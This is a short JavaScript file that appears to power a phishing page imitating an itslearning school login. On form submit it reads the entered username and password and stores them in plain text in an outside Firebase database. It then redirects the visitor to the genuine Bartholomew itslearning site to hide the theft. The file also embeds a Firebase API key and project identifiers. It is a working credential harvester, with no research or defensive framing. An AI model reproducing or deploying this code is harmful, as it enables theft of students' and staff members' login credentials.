
const firebaseConfig = {
  apiKey: "AIzaSyAyStv1n4oC8P6obOd0kEU-fTZ9MnFKmh4",
  authDomain: "itslearning-db590.firebaseapp.com",
  databaseURL: "https://itslearning-db590-default-rtdb.firebaseio.com",
  projectId: "itslearning-db590",
  storageBucket: "itslearning-db590.appspot.com",
  messagingSenderId: "33953381243",
  appId: "1:33953381243:web:01f9704472d11767ee9bde",
  measurementId: "G-F16B8NCPTY"
};

firebase.initializeApp(firebaseConfig);

var messagesRef = firebase.database().ref('logIn');

document.getElementById('logInInfo').addEventListener('submit', submitForm);

function submitForm(e) {
  e.preventDefault();

  //get values
  var username = getInputVal('username');
  var password = getInputVal('password');

  saveData(username, password);

  window.location.replace("https://bartholomew.itslearning.com/index.aspx")
}

function getInputVal(id) {
  return document.getElementById(id).value;
}

function saveData(username, password) {
  var newMessageRef = messagesRef.push();
    newMessageRef.set({
    username: username,
    password: password
  });
}
